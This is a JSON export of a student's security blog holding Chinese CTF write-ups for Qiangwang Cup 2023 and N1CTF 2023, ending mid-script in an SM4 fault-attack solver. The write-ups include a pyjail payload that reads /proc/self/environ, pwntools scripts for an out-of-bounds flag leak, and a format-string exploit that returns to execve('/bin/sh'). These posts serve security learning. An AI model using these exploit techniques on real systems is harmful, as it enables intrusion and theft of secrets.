{"meta":{"title":"lmarch2'blog","subtitle":"求知若渴，虚心若愚","description":"A Student studying Cybersecurity","author":"lmarch2","url":"http://lmarch2.github.io","root":"/"},"pages":[{"title":"","date":"2024-02-02T07:52:02.703Z","updated":"2024-02-02T07:52:02.703Z","comments":true,"path":"404.html","permalink":"http://lmarch2.github.io/404.html","excerpt":"","text":"title:404 date:2024-02-02 14:59:42 type:”404” layout:”404” description:”Oops～，我崩溃了！找不到你想要的页面 :(“"},{"title":"about","date":"2023-01-13T01:47:46.000Z","updated":"2024-02-02T07:51:53.388Z","comments":true,"path":"about/index.html","permalink":"http://lmarch2.github.io/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-01-12T09:51:25.000Z","updated":"2024-02-02T07:51:23.895Z","comments":true,"path":"tags/index.html","permalink":"http://lmarch2.github.io/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2024-02-02T06:54:59.000Z","updated":"2024-02-02T07:51:37.563Z","comments":true,"path":"friends/index.html","permalink":"http://lmarch2.github.io/friends/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-01-12T14:55:53.000Z","updated":"2024-02-02T07:59:36.360Z","comments":true,"path":"categories/index.html","permalink":"http://lmarch2.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"HASHTEAM2023强网杯wp","slug":"HASHTEAM强网杯2024WP","date":"2024-01-29T16:47:18.000Z","updated":"2024-02-04T06:55:24.346Z","comments":true,"path":"posts/19b7e153/","link":"","permalink":"http://lmarch2.github.io/posts/19b7e153/","excerpt":"","text":"2023强网杯强网杯疯狂坐牢，pwn做不了一点只能在强网先锋划划水….只能说，来年再战！ CryptoNot only rsa开就完了,直接上代码 from Crypto.Util.number import * from tqdm import tqdm n = 6249734963373034215610144758924910630356277447014258270888329547267471837899275103421406467763122499270790512099702898939814547982931674247240623063334781529511973585977522269522704997379194673181703247780179146749499072297334876619475914747479522310651303344623434565831770309615574478274456549054332451773452773119453059618433160299319070430295124113199473337940505806777950838270849 e = 641747 c = 730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943 p=91027438112295439314606669837102361953591324472804851543344131406676387779969 F=Zmod(n) root=F(c).nth_root(e,all=True) #print(root[0]) for i in tqdm(root): m=long_to_bytes(int(i)) if b'flag' in m: print(m) flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a} Babyrsa论文题,搜了半天https://www.sciencedirect.com/science/article/pii/S0304397523002116 接下来是复现代码,但最后没能求出解 from math import floor N=6898173619848064713447564687612858995735894135343384489074201607621085283538310939996931861826971767108397996532717248188385645126212591434896047930808649179911798954640222107637439329674735608839417381358005576992626135001753481619659559186340117078191830600433093397242376731829372681835293083621809 e=18607371079843502780378872043757955319820913116247483798885064959406363250603378245586504841113742273225193107044375347430381173075888621199154655015790594262611354939631226770280837471203456810631351598504038204190312822325230950609345436371947238885587725399278901711345945547722129359115083215511568569473191308964154024336081584451627244805369215138746534093267741448684155642482008850649100654786552416480077517243070018360909360575406706389289250072987726362674233556989150088794863182955760986933773623415912617726008667185604638388708370787554333594517677850758769655741063461283985588988450577 # N=611402847577596838649117628567007514815745193613363898749361 # e=256620536587836325389289742308993660982466972819568896656661249105081887104266414292000389611061562475252796784804753727 def small_roots(f, bounds, m, d=None): monomials=[] pols=[] if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for s in range(m + 1): for i in range(s,m+1): for j in range(2*s,2*s+2): base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s) G.append(base) for s in range(m + 1): for i in range(s,s+1): for j in range(2*s+2,2*s+t+1): base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s) G.append(base) for poly in G: for v in poly.monomials(): if v not in monomials: monomials.append(v) print(len(G)) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) print(B.nrows(),B.ncols()) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] alpha=1.997 beta=0.1 delta=0.678 r=100 m=4 t=4 FF=Zmod(2^r) u=FF(N).nth_root(2,all=True) print(\"u=\",u) #u0=63161 u0=603393209736955919317955738297 v0=2*u0+(N-u0^2)*inverse_mod(u0,2^(2*r))%2^(2*r) print(\"v0=\",v0) #v0=200472128882 #v0=1567679278734573458233752031864430279097731087941138563289698 a1=v0*inverse_mod(2^(2*r-1),e)%e print(a1) a2=(v0^2-(N+1)^2)*inverse_mod(2^(4*r),e)%e print(a2) a3=(-1)*inverse_mod(2^(4*r),e)%e print(a3) X=floor(2*N^(alpha+delta-2)) Y=floor(3*N^(0.5-2*beta)) print('X',X) print(\"Y\",Y) F.=PolynomialRing(ZZ) f=x*y^2+a1*x*y+a2*x+a3 res=small_roots(f,(X,Y),m) print(res) MiscHappy Chess|SOLVED|1r0ny非常凑巧，前几周看到了b站上的一个翻转棋的视频 那么思路如下： 首先对于初始棋盘来说，只要把白棋或者黑棋的位置都点一遍就可以变成相同颜色 但是规定要240步之内赢10局，所以每局就有步数限制，要在大约24步之内赢一局 所以要进行步骤的优化，优化思路如下： 对于9*9的棋盘如果把一整行或者一整列全部翻转，就会把整个棋盘直接翻转 所以对于每一个可行解，可以通过观察来进行步骤的优化 把每一次的步骤优化到24步以内之后通关即可： 本题运用b站视频里的优化原理，手动玩了10次，每次步数均在24步以内，成功拿到flag flag{1449c7f2379d58899db438adc243867d} 由于时间充裕，所以我是用手优化的，但是其实可以使用脚本爆破，一共有9+9=18条可以翻转的行和列，所以所有可行解的情况就有$$2^{18}$$种情况，只要使用代码全部爆破出来然后看哪个点最少就行。 Pyjail ! It’s myFILTER !!!读环境变量获取flag {print(open(\"/proc/self/environ\").read())} 强网先锋石头剪刀布？该模型对于相同输入的输出具有确定性，于是可以先指定前五个，再逐轮爆破 ####### 180 from random import choice import random from pwn import * def main(): # 设置目标地址和端口 ip = '8.147.133.95'#'8.147.135.248' port = 19260#39167 context(log_level = 'debug',os = 'linux') # 创建一个连接到目标的socket #choice = [0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1,2] choice=[0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 1, 2, 0, 0, 2, 2, 1, 1, 0, 1, 2, 0, 1, 0, 1, 0, 2, 1, 2, 2, 0, 2, 1, 0, 0, 2, 2, 1, 1, 0, 1, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 0, 0, 1, 1, 1, 2, 2, 1, 0, 1, 2, 2, 0, 1, 2, 0, 2, 0, 1, 1, 0] sock = remote(ip, port) response = sock.recvuntil('++++++++++++++++++++++++++++++++++++++++++++++++++'.encode()) with open('replay.txt', 'w') as f: choice.append(random.randint(0,2)) print(choice) for i in range(len(choice)): sock.sendlineafter('请出拳（0 - 石头，1 - 剪刀，2 - 布）：'.encode(),str(choice[i]).encode()) response = sock.recv(0x110).decode() f.write(response + '\\n') if(i < 5): continue if 'Me10n赢了' in response: print(i,choice[i]) print(choice) print((choice[i]+1)%3) break elif '平局' in response: print(i,choice[i]) print(choice) print((choice[i]+2)%3) break f.interactive() # 关闭连接 sock.close() if __name__ == '__main__': main() Speedup先看看前20个 from math import floor from tqdm import tqdm n=0 l=[] for i in range(1,21): n=0 result = factorial(2^i) res=str(result) for j in res: n+=int(j) print(n) l.append(n) print(l) 输到这里https://oeis.org/数数第27个,做个md5得到结果 或者利用勒让德定理,分解(2^27)! n=2^27 faclist=[] for p in tqdm(range(2,n)): if is_prime(p): k=1 res=0 while True: m=pow(p,k) if n>=m: res+=floor(n/m) else: break k+=1 faclist.append((p,res)) else: continue # faclist=str(faclist) # with open('test.txt', 'w') as f: # f.write(faclist) res=1 for i in tqdm(faclist): res*=pow(i[0],i[1]) n=0 for i in str(res): n+=int(i) print(n) 然后再计算 easyfuzz开始先发现9个字符+\\n能够吧前两位置为11，尝试遍历所有字符可能 调整输入的字符串，从最后一位开始诸位爆破（代码中逐个改repeat） from Excalibur import * import itertools import string def generate_strings(): # 定义要包含的字符集合 characters = string.ascii_letters + string.digits + string.punctuation # 生成所有长度为9的可能字符串 all_combinations = itertools.product(characters, repeat=3) # 逐个生成字符串并返回 for combination in all_combinations: yield ''.join(combination) # 使用生成器函数逐个获取字符串 string_generator = generate_strings() # 打印前几个字符串 #contextset() remo('101.200.122.251',12199,1) #remo('101.200.122.251',12188,1) for _ in range(1000): str = (next(string_generator)+'wbGood') sl(str) ru(b'code') m = ru(b'\\n') if not b'110000000' in m: print(str,m) #sl(b'1'*9) #sl(b'\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff') #sl(b'\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff') ia() qwb{YouKnowHowToFuzz!} Trie手动硬搓，也可以写脚本更快 首先理清程序逻辑，在trie树中储存ip，查找时通过控制v3的值，越界读取end数组，从secret里读出flag 调试发现，对于树中每插入节点的时候，tot+1，于是首先让tot为0x40，再控制ip（在二进制下每次减少一个1）使得tot每次+4，即可4字节4字节地读出flag。（需要注意的是会对tot进行一个*4的操作） from Excalibur import * #proc('./trie') remo('47.104.150.173',1337,1) contextset() ''' for i in range(100): ip1 = '192.168.1.'+(str(i)) sla(b'Quit.',b'1') sla(b'IP:',ip1) ip2 = '192.168.1.'+str(i+1) sla(b'hop:',ip2) sla(b'Quit.',b'2') ''' def setip(ip1,ip2): sla(b'Quit.',b'1') sla(b'IP:',ip1) sla(b'hop:',ip2) def show(ip): sla(b'Quit.',b'3') sla(b'Quit.',b'2') sla(b'IP:',ip) ru(b'is') flag = ru(b'\\n') print(flag) pause() debug('b *$rebase(0x4060)\\nb *$rebase(0x1619)\\n') setip(b'0.0.0.0',b'0.0.0.0')#+0x20 setip(b'255.255.255.255',b'0.0.0.0')#+0x20 #setip(b'127.255.255.255',b'0.0.0.0')#+0x4 #setip(b'63.255.255.255',b'0.0.0.0')#+0x4 #setip(b'31.255.255.255',b'0.0.0.0')#+0x4 #setip(b'15.255.255.255',b'0.0.0.0')#+0x4 #setip(b'7.255.255.255',b'0.0.0.0')#+0x4 #setip(b'3.255.255.255',b'0.0.0.0')#+0x4 #setip(b'1.255.255.255',b'0.0.0.0')#+0x4 #setip(b'0.255.255.255',b'0.0.0.0')#+0x4 #setip(b'0.127.255.255',b'0.0.0.0')#+0x4 #setip(b'0.63.255.255',b'0.0.0.0')#+0x4 setip(b'0.31.255.255',b'0.0.0.0')#+0x4 #setip(b'0.255.255.255',b'0.0.0.0')#+0x4 #show(b'127.255.255.255') #show(b'63.255.255.255') #show(b'31.255.255.255') #show(b'15.255.255.255') #show(b'7.255.255.255') #show(b'3.255.255.255') #show(b'1.255.255.255') #show(b'0.255.255.255') #show(b'0.127.255.255') #show(b'0.63.255.255') show(b'0.31.255.255') ia() numbers = \"0.0.0.125.115.121.117.103.95.117.48.121.95.115.64.95.103.110.48.114.116.115.95.53.97.95.51.109.48.99.51.66.95.48.116.95.119.48.72.123.103.97.108.102\" reversed_numbers = numbers.split(\".\")[::-1] ascii_chars = [chr(int(num)) for num in reversed_numbers] result = \"\".join(ascii_chars) print(result) flag{H0w_t0_B3c0m3_a5_str0ng_@s_y0u_guys} ez_fmt修改printf的返回地址劫持程序流，同时泄漏libc地址，第二次printf改返回地址为one_shot,这里不能以下写ln不然会特别慢。 from evilblade import * context(os='linux', arch='amd64') context(os='linux', arch='amd64', log_level='debug') setup('./pwn') libset('./libc-2.31.so') #libset('./libc.so.6') evgdb() rsetup('47.104.24.40', 1337) stack = getx(-15,-1) stack1 = stack - 8 dx(stack1) #修改printf的返回地址 sd(b'%4198556c'+b'%19$paaa'+b'aaa%9$n'+p64(stack1)) libc = getx(-65,-51) base = getbase(libc,'__libc_start_main',243) os = base + 0xe3b01 os1 = os %0x10000 os2 = os %0x1000000 os2 = os2 >> 16 dx(stack) dx(os) pay1 = f'%{os2-4}c'.encode().ljust(8,b'a') pay2 = f'%{os1-os2-3}c'.encode().ljust(8,b'a') print(pay1) pay = pay1 + b'a%11$hhn'+ pay2 +b'aa%10$hn' +p64(stack-232)+p64(stack-230) print(len(pay)) pause() sl(pay) ia() ''' 0xe3afe execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL 0xe3b01 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL 0xe3b04 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL ''' flag{such_@n_ea5y_fmt_9ame_f0r_y0u}","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"杯子","slug":"杯子","permalink":"http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"}]},{"title":"HASHTEAM2023N1ctfWP","slug":"HASHTEAMn1ctf2023WP","date":"2024-01-29T15:47:41.000Z","updated":"2024-02-04T06:55:11.477Z","comments":true,"path":"posts/d8c86fdf/","link":"","permalink":"http://lmarch2.github.io/posts/d8c86fdf/","excerpt":"","text":"N1CTF2023 排名25，卡线 Cryptowarmupnonce有问题 数学模型： e=2^128*e1+e2 d=2^128*d1+d2 nonce=2^128*e1+d1 s=(e+rd)/nonce mod n 展开 s2^128e1+sd1=2^128e1+e2+r*(2^128*d1+d2) mod n (s-1)2^128e1+(s-r*2^128)d1-rd2-e2==0 mod n 造格子 注意到d最高2^255一定为1，卡下界 SM4差分故障打四轮，直接上脚本 from copy import copy DB = [[46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [246, 56, 103, 21, 181, 105, 216, 118, 145, 183, 169, 211, 27, 242, 190, 162, 237, 179, 244, 199, 206, 35, 120, 38, 95, 133, 25, 231, 3, 70, 40, 238, 223, 45, 127, 245, 4, 15, 250, 11, 52, 215, 142, 129, 167, 191, 61, 241, 188, 226, 249, 146, 221, 184, 104, 109, 157, 39, 176, 114, 236, 240, 254, 253, 251, 158, 198, 37, 42, 19, 87, 230, 153, 43, 77, 76, 208, 26, 32, 18, 150, 195, 122, 90, 80, 148, 197, 44, 83, 51, 166, 75, 88, 73, 64, 252, 20, 119, 46, 201, 196, 121, 222, 115, 22, 128, 164, 102, 97, 5, 217, 172, 177, 81, 58, 234, 168, 60, 29, 124, 147, 101, 224, 151, 130, 65, 98, 225, 155, 91, 108, 152, 140, 219, 9, 24, 189, 203, 138, 160, 59, 48, 193, 14, 69, 159, 233, 53, 135, 143, 33, 165, 41, 132, 57, 187, 227, 93, 200, 1, 0, 149, 137, 194, 23, 117, 170, 247, 17, 255, 92, 205, 47, 213, 136, 66, 2, 209, 6, 110, 78, 63, 28, 74, 235, 229, 30, 139, 154, 94, 131, 49, 86, 185, 163, 79, 68, 8, 72, 174, 99, 111, 141, 107, 210, 34, 207, 239, 106, 144, 228, 186, 89, 204, 55, 54, 171, 161, 100, 16, 13, 7, 50, 182, 112, 173, 212, 31, 214, 85, 156, 180, 175, 116, 248, 243, 36, 82, 134, 123, 220, 10, 125, 96, 67, 62, 12, 202, 126, 71, 84, 113, 232, 178, 192, 218], [46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [206, 165, 193, 37, 187, 108, 248, 246, 44, 139, 152, 201, 173, 214, 77, 72, 97, 35, 70, 24, 3, 79, 178, 175, 30, 66, 18, 198, 114, 125, 32, 210, 180, 224, 235, 28, 62, 136, 149, 227, 82, 147, 90, 119, 85, 199, 126, 121, 51, 20, 88, 4, 75, 101, 38, 151, 109, 115, 110, 223, 43, 17, 146, 249, 226, 26, 222, 232, 87, 195, 200, 131, 245, 81, 113, 157, 220, 12, 16, 184, 204, 192, 84, 31, 197, 215, 129, 94, 93, 181, 218, 194, 65, 148, 158, 112, 221, 34, 25, 33, 243, 78, 10, 67, 209, 6, 252, 196, 237, 42, 172, 164, 161, 244, 111, 191, 46, 170, 128, 69, 183, 212, 60, 99, 8, 122, 49, 86, 247, 96, 179, 57, 135, 106, 0, 58, 100, 202, 55, 98, 1, 254, 53, 155, 156, 83, 132, 9, 19, 171, 48, 95, 166, 68, 22, 104, 7, 14, 142, 211, 213, 50, 150, 234, 182, 203, 217, 64, 185, 163, 73, 45, 41, 118, 103, 134, 186, 230, 241, 250, 52, 207, 162, 124, 140, 116, 167, 228, 92, 63, 47, 176, 239, 238, 5, 216, 225, 188, 137, 160, 80, 231, 102, 11, 89, 91, 59, 23, 240, 105, 153, 177, 138, 219, 174, 123, 36, 159, 76, 21, 56, 242, 61, 107, 133, 143, 154, 130, 233, 15, 145, 255, 13, 189, 120, 251, 236, 117, 208, 190, 169, 168, 74, 229, 54, 2, 39, 127, 29, 253, 141, 71, 205, 40, 144, 27]] WDB=DB[2:]+DB[:2] i2l = lambda x: [(x >> 24) & 0xff, (x >> 16) & 0xff, (x >> 8) & 0xff, x & 0xff] l2i = lambda x: (x[0] < 24)|(x[1] < 16)|(x[2] < 8)|x[3] rotl32 = lambda x, n: ((x < n) & 0xffffffff) | ((x >> (32-n)) & 0xffffffff) rotl8 = lambda x, n: ((x < n) & 0xff) | ((x >> (8-n)) & 0xff) xor = lambda x, y: list(map(lambda a, b: a ^ b, x, y)) pad = lambda data, block=16: data + [16 - len(data) % block]*(16 - len(data) % block) SM4_BOXES_TABLE = [ 0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05, 0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62, 0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6, 0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8, 0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35, 0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87, 0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e, 0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1, 0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3, 0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f, 0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51, 0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8, 0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0, 0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84, 0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48, ] SM4_FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] SM4_CK = [ 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 ] Dance_Box=DB def dance(): global Dance_Box Dance_Box = Dance_Box[2:]+Dance_Box[:2] def round_key(k): ar = [SM4_BOXES_TABLE[i] for i in i2l(k)] b = l2i(ar) return b ^ rotl32(b, 13) ^ rotl32(b, 23) def expand_key(master_key): master_key = list(master_key) MK = [l2i(master_key[:4]), l2i(master_key[4:8]),\\ l2i(master_key[8:12]), l2i(master_key[12:])] k = [0]*36 k[0:4] = xor(MK, SM4_FK) for i in range(32): k[i + 4] = k[i] ^ (round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i])) return k[4:] def tfunc(bk): ar = [SM4_BOXES_TABLE[i] for i in i2l(bk)] b = l2i(ar) return b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24) def invtfunc(b): b=d(b) ar=i2l(b) bk = [SM4_BOXES_TABLE.index(i) for i in ar] bk=l2i(bk) return bk def pfunc(bk): res = [] for i in range(4): sbox = Dance_Box[i] ar = [sbox[_] for _ in i2l(bk[i])] b = [rotl8(ar[i], i+3) for i in range(4)] res.append(l2i(b)) return res def invpfunc(res,D=DB): bk = [] for i in range(4): sbox = D[i] b=i2l(res[i]) ar=[rotl8(b[j], 8-(j+3)) for j in range(4)] bki=[sbox.index(_) for _ in ar] bk.append(l2i(bki)) return bk def one_round(bk, rk, dt): out = [] buf = [0]*36 buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])] for i in range(32): if dt == i: dance() buf[i+4] = buf[i] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i]) buf[i+1:i+5] = pfunc(buf[i+1:i+5]) dance() for _ in range(4): out += i2l(buf[-1-_]) return out def crypt_ecb(pt, key, dance_time=-1): pt = pad(list(pt)) rk = expand_key(key) block = [pt[_:_+16] for _ in range(0, len(pt), 16)] result = b'' for i in block: result += bytes(one_round(i, rk, dt=dance_time)) return result t=lambda b:b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24) d=lambda b:rotl32(b,30)^rotl32(b,24)^rotl32(b,22)^rotl32(b,18)^rotl32(b,16)^rotl32(b,14)^rotl32(b,12)^rotl32(b,8)^rotl32(b,4)^rotl32(b,2)^b from random import * ct = ['e5a304ea2ffc53a1ff94337c2b2ae5368b46c6da3cc37f8438eb967b29249d4e', '6733baa353d4cfc4ff94337c58dc7fdbd6df83f4fbf6e5e838eb967b98d7e8d3', 'e77dbfe7868701fbd7072e6358dc7fdba067d296707bad1b0f4541dc98d7e8d3', '54b772d532556d5573a6ab667c9ff76857b5efc3b62130668e46a79b163138e4', '47339f6738dd9f4c9581fbd496dde76ea320d95b457e0373cddb910acc41fe35'] #for i in range(100): # a=getrandbits(32) # b=getrandbits(32) # assert(tfunc(a)^tfunc(b)==tfunc(a^b)) ct0t=bytes.fromhex(ct[0][:32]) ct0f=bytes.fromhex(ct[1][:32]) #ct1t=bytes.fromhex(ct[0][32:]) #ct1f=bytes.fromhex(ct[1][32:]) buft=[0]*36 buff=[0]*36 for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4]) buft[32:]=invpfunc(buft[32:],WDB) buff[32:]=invpfunc(buff[32:],WDB) #assert(invpfunc(buft[31:35],DB)[1:]==invpfunc(buff[31:35],WDB)[1:]) dt=i2l(d(buff[35]^buft[35])) print(dt) dt=i2l(d(buff[35])^d(buft[35])) print(dt) rkl0=[set() for i in range(4)] print((dt)) print(i2l(buff[32]^buft[32])) print(i2l(buff[33]^buft[33])) print(i2l(buff[34]^buft[34])) ict=i2l(buft[32]^buft[34]^buft[33]) icf=i2l(buff[32]^buff[34]^buff[33]) print(ict,icf) for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl0[i].add(guess) print(rkl0) rkl0_1=copy(rkl0) print() #ct0t=bytes.fromhex(ct[0][:32]) #ct0f=bytes.fromhex(ct[1][:32]) ct0t=bytes.fromhex(ct[0][32:]) ct0f=bytes.fromhex(ct[1][32:]) buft=[0]*36 buff=[0]*36 for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4]) buft[32:]=invpfunc(buft[32:],WDB) buff[32:]=invpfunc(buff[32:],WDB) assert(invpfunc(buft[31:],DB)[1:]==invpfunc(buff[31:],WDB)[1:]) dt=i2l(d(buff[35]^buft[35])) rkl0=[set() for i in range(4)] print((dt)) print(i2l(buff[32]^buft[32])) print(i2l(buff[33]^buft[33])) print(i2l(buff[34]^buft[34])) ict=i2l(buft[32]^buft[34]^buft[33]) icf=i2l(buff[32]^buff[34]^buff[33]) print(ict,icf) for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl0[i].add(guess) print(rkl0) rk=[] for rki in range(4): print(rki) 